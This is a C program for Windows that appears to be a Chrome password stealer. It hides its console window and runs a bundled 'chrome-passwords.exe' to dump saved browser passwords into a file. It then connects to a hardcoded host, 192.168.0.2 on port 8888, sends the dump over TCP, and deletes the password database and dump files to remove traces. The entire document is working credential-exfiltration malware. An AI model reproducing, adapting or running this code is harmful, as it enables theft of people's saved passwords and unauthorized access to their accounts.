#include<stdio.h>
#include<direct.h>
#include <windows.h>
#include <pthread.h>
#include <unistd.h>
#include <fcntl.h>
#include <io.h>
#include <sys/stat.h>
#pragma  comment(lib,"ws2_32.lib")

#define port 8888
#define ip "192.168.0.2"
char *buffer, *b2, *b3, b4[199];

void* child();
int main()
{
    FreeConsole();
    //輸出密碼
    pthread_t one;
    pthread_create(&one, NULL, child, NULL);
    sleep(50);
	printf("a\n");
    //socket
    WORD sockVersion = MAKEWORD(2, 2);
    WSADATA data;
    if(WSAStartup(sockVersion, &data) != 0)
        {
            return 0;
        }

    SOCKET sclient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sclient == INVALID_SOCKET)
        {
            printf("invalid socket !");
            return 0;
        }

    struct sockaddr_in serAddr;
    serAddr.sin_family = AF_INET;
    serAddr.sin_port = htons(port);
    serAddr.sin_addr.S_un.S_addr = inet_addr(ip);
    while(1)
        if (connect(sclient, (struct sockaddr *)&serAddr, sizeof(serAddr)) != SOCKET_ERROR)
            break;
        else
            printf("connect error !\n");

    b3 = getcwd(NULL, 0);
    strcat(b3, "\\file\\a");
    FILE *fptr;
    fptr = fopen(b3, "r");

    //傳送
    if(fptr != NULL)
        {
            wchar_t ch[1024];
            while(fgetws (ch, 255, fptr) != NULL )
                {
                    send(sclient, (char*)ch, sizeof(ch), 0);
                    Sleep(50);
                }
        }

    //刪除文件
    remove ("passwordsDB");
    remove ("file\\passwordsDB");
    remove ("file\\a");
}

void* child()
{
    FreeConsole();
    buffer = getcwd(NULL, 0);
    b2 = getcwd(NULL, 0);
    strcat(b2, "\\file\\a");
    printf("%s\n", b2);
    strcpy(b4, b2);
	 
    strcat(buffer, "\\file\\chrome-passwords.exe > ");
    strcat(buffer, b4);
    system(buffer);
    pthread_exit(NULL);
}
